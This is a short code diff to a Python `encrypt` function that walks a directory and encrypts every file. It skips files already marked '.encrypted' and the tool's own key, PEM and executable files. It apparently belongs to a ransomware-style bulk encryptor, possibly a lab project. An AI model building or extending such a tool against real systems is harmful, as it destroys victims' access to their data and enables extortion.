@@ -19,8 +19,7 @@ def encrypt(key,path):
             os.chdir(f"{path}")
             continue
         filn = fil.split('.')
-        #print(filn[0])
-        if filn[1]!='encrypted' and fil!='aesd.py' and fil!='receiver.pem' and fil!='key.key' and fil!='key1.key' and fil!='aese.py' and fil!='private_pem.encrypted':
+        if (len(fil)<=10 or fil[-10:]!='.encrypted') and fil!='aese' and fil!='aese.exe' and fil!='aesd.py' and fil!='receiver.pem' and fil!='key.key' and fil!='key1.key' and fil!='aese.py' and fil!='private_pem.encrypted':
 
             #iv = os.urandom(16)
             iv = get_random_bytes(16)
